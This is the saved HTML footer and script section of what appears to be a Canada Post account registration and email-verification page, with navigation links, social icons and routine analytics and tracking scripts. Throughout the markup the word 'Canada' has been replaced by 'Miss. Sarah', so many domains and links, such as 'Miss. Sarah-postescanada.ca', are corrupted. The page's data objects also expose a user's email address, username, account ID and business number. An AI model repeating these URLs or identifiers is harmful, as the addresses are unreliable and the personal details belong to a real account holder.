fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Linkedin</title><path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.youtube.com/user/postesMiss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>YouTube</title><g transform="translate(2 5)" fill="none" fill-rule="evenodd"><path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path></g></svg>
</a></li>
    
    </ul>    
    
    
    
    <ul class="feedback-group">
      
    <li><div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div><a href="https://evaluation.Miss. Sarah-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank"><span class="tool-description">Website feedback</span></a></li>
    
    </ul>    
    
    </div>
    <div class="large-3 columns">
    
    <h2 class="show-for-medium-up">Support</h2>
    <ul>
      
    <li><a href="//cpc/en/support.page" class="chat-link" target="">Need help?</a></li>
    
    <li><a href="//cpc/en/support.page#panel2-3" class="chat-link" target="">Contact us</a></li>
    
    </ul>    
    
    </div>
    <div class="large-3 columns">
    
    <h2 class="show-for-medium-up">Corporate</h2>
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us.page" target="">About us</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a></li>
    
    <li><a href="//cpc/en/our-company/jobs.page" target="">Careers</a></li>
    
    <li><a href="https://infopost.ca/" target="">I'm an employee</a></li>
    
    <li><a href="https://mysite.Miss. Sarah.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a></li>
    
    </ul>    
    
    </div>
    <div class="large-3 columns">
    
    <h2 class="show-for-medium-up">Blogs</h2>
    <ul>
      
    <li><a href="//blogs/business" target="">Business Matters</a></li>
    
    <li><a href="//blogs/personal" target="">Canada Post Magazine</a></li>
    
    </ul>    
    
    </div>
  </div>
  <div class="row show-for-medium-only">
    <div class="medium-6 columns">
    
    <h2 class="show-for-medium-up">Connect with us</h2>
    <ul class="social-media-icons">
      
    <li><a href="https://www.facebook.com/Miss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Facebook</title><path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://twitter.com/Miss. Sarahcorp" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.instagram.com/Miss. Sarahagram/?hl=en" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Linkedin</title><path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.youtube.com/user/postesMiss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>YouTube</title><g transform="translate(2 5)" fill="none" fill-rule="evenodd"><path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path></g></svg>
</a></li>
    
    </ul>    
    
    
    
    <ul class="feedback-group">
      
    <li><div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div><a href="https://evaluation.Miss. Sarah-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank"><span class="tool-description">Website feedback</span></a></li>
    
    </ul>    
    
    
    <h2 class="show-for-medium-up">Support</h2>
    <ul>
      
    <li><a href="//cpc/en/support.page" class="chat-link" target="">Need help?</a></li>
    
    <li><a href="//cpc/en/support.page#panel2-3" class="chat-link" target="">Contact us</a></li>
    
    </ul>    
    
    </div>
    <div class="medium-6 columns">
    
    <h2 class="show-for-medium-up">Corporate</h2>
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us.page" target="">About us</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a></li>
    
    <li><a href="//cpc/en/our-company/jobs.page" target="">Careers</a></li>
    
    <li><a href="https://infopost.ca/" target="">I'm an employee</a></li>
    
    <li><a href="https://mysite.Miss. Sarah.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a></li>
    
    </ul>    
    

    
    <h2 class="show-for-medium-up">Blogs</h2>
    <ul>
      
    <li><a href="//blogs/business" target="">Business Matters</a></li>
    
    <li><a href="//blogs/personal" target="">Canada Post Magazine</a></li>
    
    </ul>    
    
    </div>
  </div>
  <div class="row show-for-small-only">
    <div class="small-12 columns">
      <ul class="accordion" data-accordion="data-accordion" role="tablist">
        <li>
          <h2>Connect with us</h2>
          
    <h2 class="show-for-medium-up">Connect with us</h2>
    <ul class="social-media-icons">
      
    <li><a href="https://www.facebook.com/Miss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Facebook</title><path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://twitter.com/Miss. Sarahcorp" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.instagram.com/Miss. Sarahagram/?hl=en" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg"><title>Linkedin</title><path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path></svg>
</a></li>
    
    <li><a href="https://www.youtube.com/user/postesMiss. Sarah" target="_blank">
<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>YouTube</title><g transform="translate(2 5)" fill="none" fill-rule="evenodd"><path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path></g></svg>
</a></li>
    
    </ul>    
    
          
    
    <ul class="feedback-group">
      
    <li><div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div><a href="https://evaluation.Miss. Sarah-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank"><span class="tool-description">Website feedback</span></a></li>
    
    </ul>    
    
          <hr>
        </li>
        <li class="accordion-navigation">
          <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#panelSupport" role="tab" class="accordion-title" id="panelSupport-heading" aria-controls="panelSupport"><h2>Support</h2></a>
          <div id="panelSupport" class="content" role="tabpanel" aria-labelledby="panelSupport-heading">
            
    <h2 class="show-for-medium-up">Support</h2>
    <ul>
      
    <li><a href="//cpc/en/support.page" class="chat-link" target="">Need help?</a></li>
    
    <li><a href="//cpc/en/support.page#panel2-3" class="chat-link" target="">Contact us</a></li>
    
    </ul>    
    
          </div>
          <hr>
        </li>
        <li class="accordion-navigation">
          <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#panelCorporate" role="tab" class="accordion-title" id="panelCorporate-heading" aria-controls="panelCorporate"><h2>Corporate</h2></a>
          <div id="panelCorporate" class="content" role="tabpanel" aria-labelledby="panelCorporate-heading">
            
    <h2 class="show-for-medium-up">Corporate</h2>
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us.page" target="">About us</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a></li>
    
    <li><a href="//cpc/en/our-company/jobs.page" target="">Careers</a></li>
    
    <li><a href="https://infopost.ca/" target="">I'm an employee</a></li>
    
    <li><a href="https://mysite.Miss. Sarah.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a></li>
    
    <li><a href="//cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a></li>
    
    </ul>    
    
          </div>
          <hr>
        </li>
        <li class="accordion-navigation">
          <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#panelBlogs" role="tab" class="accordion-title" id="panelBlogs-heading" aria-controls="panelBlogs"><h2>Blogs</h2></a>
          <div id="panelBlogs" class="content" role="tabpanel" aria-labelledby="panelBlogs-heading">
            
    <h2 class="show-for-medium-up">Blogs</h2>
    <ul>
      
    <li><a href="//blogs/business" target="">Business Matters</a></li>
    
    <li><a href="//blogs/personal" target="">Canada Post Magazine</a></li>
    
    </ul>    
    
          </div>
          <hr>
        </li>
      </ul>
    </div>
  </div>
</section>

<section class="footer-l2 cpc-tb--suppress-toolbar" role="contentinfo" aria-label="Content info">
  <div class="row large-up-footer show-for-large-up">
    <div class="large-12 columns text-center">
      <div class="left-items text-left">
      © Canada Post Corporation
      </div>
      <div class="center terms-links">
      
    
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a></li>
    
    <li><a href="//cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a></li>
    
    <li><a href="//cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a></li>
    
    <li><a href="//cpc/en/our-company/research-panel.page" target="">Research</a></li>
    
    </ul>    
    
      </div>
      <div class="right-items">
      <a href="https://www.canada.ca/"><img src="./successful_files/gov-canada-logo.svg" alt="Canada"></a>
      </div>
    </div>
  </div>
  <div class="row show-for-medium-only">
    <div class="large-12 columns text-center">
      
      <div class="terms-links">
      
    
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a></li>
    
    <li><a href="//cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a></li>
    
    <li><a href="//cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a></li>
    
    <li><a href="//cpc/en/our-company/research-panel.page" target="">Research</a></li>
    
    </ul>    
    
      </div>
        <div class="cpc-corp-copyright">
        © Canada Post Corporation

          <div class="gov-can-logo">
          <a href="https://www.canada.ca/"><img src="./successful_files/gov-canada-logo.svg" alt="Canada"></a>
          </div>
        </div>
    </div>
  </div>
  <div class="row show-for-small-only">
    <div class="large-12 columns text-center">
      
      <div class="center terms-links">
      
    
    <ul>
      
    <li><a href="//cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a></li>
    
    <li><a href="//cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a></li>
    
    <li><a href="//cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a></li>
    
    <li><a href="//cpc/en/our-company/research-panel.page" target="">Research</a></li>
    
    </ul>    
    
      </div>
      <div class="row">
        <div class="large-12 columns">
          <div class="cpc-corp-copyright">
          © Canada Post Corporation
          </div>
        </div>
      </div>
      <div class="row">
        <div class="large-12 columns">
        <div class="center">
        <a href="https://www.canada.ca/"><img src="./successful_files/gov-canada-logo.svg" alt="Canada"></a>
        </div>
        </div>
      </div>
    </div>
  </div>
</section>
</div>
</div>
<div id="ZN_0xleIR6sWSZaNY9"></div>
<script>
  (function(){var g=function(e,h,f,g){
  this.get=function(a){for(var a=a+"=",c=document.cookie.split(";"),b=0,e=c.length;b<e;b++){for(var d=c[b];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null};
  this.set=function(a,c){var b="",b=new Date;b.setTime(b.getTime()+6048E5);b="; expires="+b.toGMTString();document.cookie=a+"="+c+b+"; path=/; "};
  this.check=function(){var a=this.get(f);if(a)a=a.split(":");else if(100!=e)"v"==h&&(e=Math.random()>=e/100?0:100),a=[h,e,0],this.set(f,a.join(":"));else return!0;var c=a[1];if(100==c)return!0;switch(a[0]){case "v":return!1;case "r":return c=a[2]%Math.floor(100/c),a[2]++,this.set(f,a.join(":")),!c}return!0};
  this.go=function(){if(this.check()){var a=document.createElement("script");a.type="text/javascript";a.src=g+ "&t=" + (new Date()).getTime();document.body&&document.body.appendChild(a)}};
  this.start=function(){var a=this;window.addEventListener?window.addEventListener("load",function(){a.go()},!1):window.attachEvent&&window.attachEvent("onload",function(){a.go()})}};
  try{(new g(100,"r","QSI_S_ZN_0xleIR6sWSZaNY9","https://zn0xleir6swszany9-Miss. Sarahdigital.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_ZID=ZN_0xleIR6sWSZaNY9&Q_LOC="+encodeURIComponent(window.location.href))).start()}catch(i){}})();
  </script></div></cpc-footer>
   </div>
  </div>
  <script nonce="">
    window.__CPC__ = function() {
      return {
        pageName: "cpc.ca: > en > common > profile > registration",
        profile: {"analytics":{"profileType":"consumer"},"business":false,"cpcId":"DE5E84B9-AB91-4B60-9B49-0ACEBFB8FCAF","email":"asgddhye@hotmail.com"},
        adminPortalProfile: null,
        statusCode: "101",
        token: null,
        links: {
          Miss. SarahHomepage: "https:\/\/www.Miss. Sarah-postescanada.ca\/cpc\/en\/home.page",
          signIn: "https:\/\/sso-osu.Miss. Sarah-postescanada.ca\/lfe-cap\/en\/login?targetUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login",
          smallBusinessBenefits: "https:\/\/www.Miss. Sarah-postescanada.ca\/cpc\/en\/business\/marketing\/campaign\/small-business-welcome.page",
          usernameRecovery: "https:\/\/sso-osu.Miss. Sarah-postescanada.ca\/lfe-cap\/en\/forgotUsername"
        },
        redirectionInfo: {
          businessUrl: null,
          sourceUrl: "https:\/\/www.Miss. Sarah-postescanada.ca\/cpc\/en\/home.page",
          targetUrl: "https:\/\/www.Miss. Sarah-postescanada.ca\/shop-login"
        }
      };
    };
  </script>
  <script src="./successful_files/runtime-es2015.js" crossorigin="use-credentials" type="module"></script>
  <script src="./successful_files/runtime-es5.js" nomodule=""></script>
  <script src="./successful_files/polyfills-es2015.js" crossorigin="use-credentials" type="module"></script>
  <script src="./successful_files/polyfills-es5.js" nomodule=""></script>
  <script src="./successful_files/main-es2015.js" crossorigin="use-credentials" type="module"></script>
  <script src="./successful_files/main-es5.js" nomodule=""></script>
  <script src="./successful_files/foundation.min.js"></script>
  <script src="./successful_files/cwc.js"></script>
  <script nonce="">
    window.digitalData = {
      page: {
        attributes: {
          externalCampaignID: null,
          internalCampaignID: null,
          sourceApp: "CPC",
          sourceUrl: "https:\/\/www.Miss. Sarah-postescanada.ca\/cpc\/en\/home.page",
          targetUrl: "https:\/\/www.Miss. Sarah-postescanada.ca\/shop-login"
        },
        category: {
          pageType: "",
          primaryCategory: "profile",
          subCategory1: "registration",
          subCategory2: "email verification"
        },
        pageInfo: {
          audience: "common",
          language: "en",
          pageName: "cpc.ca: > en > common > profile > registration",
          deviceStart: "desktop",
          deviceEnd: "",
          userName: "mantuoluo",
          userEmail: "asgddhye@hotmail.com",
          businessName: null,
          businessNumber: "0025890456",
          profileType: "consumer",
          regStartStop: "device start: desktop | device end:",
          statusCode: "101",
          acctGroup: null,
          adminType: null
        }
      }
    };

    if (window._satellite) {
      window._satellite.pageBottom();
    }
  </script><!--
Event snippet for Personal Account - Start on https://www.Miss. Sarah.ca/cpc/en/personal/receiving/mobile-app.page: Please do not remove.
Place this snippet on pages with events you’re tracking. 
Creation date: 10/01/2020
-->
<script>
  gtag('event', 'conversion', {
    'allow_custom_scripts': true,
    'u1': '[Product]',
    'u2': '[Page Name]',
    'u3': '[URL]',
    'u4': '[Referral]',
    'u5': '[Language]',
    'u6': '[Journey Step]',
    'send_to': 'DC-9852050/optim0/perso0+standard'
  });
</script>
<noscript>
<img src="https://ad.doubleclick.net/ddm/activity/src=9852050;type=optim0;cat=perso0;u1=[Product];u2=[Page Name];u3=[URL];u4=[Referral];u5=[Language];u6=[Journey Step];dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;gdpr=${GDPR};gdpr_consent=${GDPR_CONSENT_755};ord=1?" width="1" height="1" alt="" class="visually-hidden"/>
</noscript>
<!-- End of event snippet: Please do not remove -->
<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '614267586032718');
fbq('trackCustom', 'Step1SSO');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=614267586032718&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<!--
Event snippet for Evergreen 2021 - Sign up - Start on : Please do not remove.
Place this snippet on pages with events you’re tracking. 
Creation date: 03/25/2021
-->
<script>
  gtag('event', 'conversion', {
    'allow_custom_scripts': true,
    'send_to': 'DC-6048943/everg0/everg0+standard'
  });
</script>
<noscript>
<img src="https://ad.doubleclick.net/ddm/activity/src=6048943;type=everg0;cat=everg0;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;gdpr=${GDPR};gdpr_consent=${GDPR_CONSENT_755};ord=1?" width="1" height="1" alt=""/>
</noscript>
<!-- End of event snippet: Please do not remove -->
<script>
if(_hasFired == 'undefined' || isNaN(_hasFired)){
  var _hasFired = 1;
} else {
  _hasFired++
}
console.log("hasFired: " + _hasFired); 
</script>
 
<script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fpfe-pap; path=/; secure";
/*]]>*/ 
</script><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./successful_files/activityi.html"></iframe>
<div id="qualtricsFeedbackModal" class="cpc-modal__template cpc-component" data-cpc-modal-options="{&quot;preserveOnClose&quot;:&quot;true&quot;,&quot;id&quot;:&quot;qualtricsFeedback&quot;,&quot;footer&quot;:false,&quot;autoOpen&quot;:false,&quot;closeLabel&quot;:&quot;Close&quot;,&quot;closeMethods&quot;:[&quot;overlay&quot;,&quot;button&quot;, &quot;escape&quot;],&quot;cssClass&quot;:[&quot;cpc-feedback-modal&quot;]}">
    <div class="cpc-modal-template-modal-body">
      <div class="row">
        <div class="large-12 columns cpc-feedback-modal-column-wrapper">
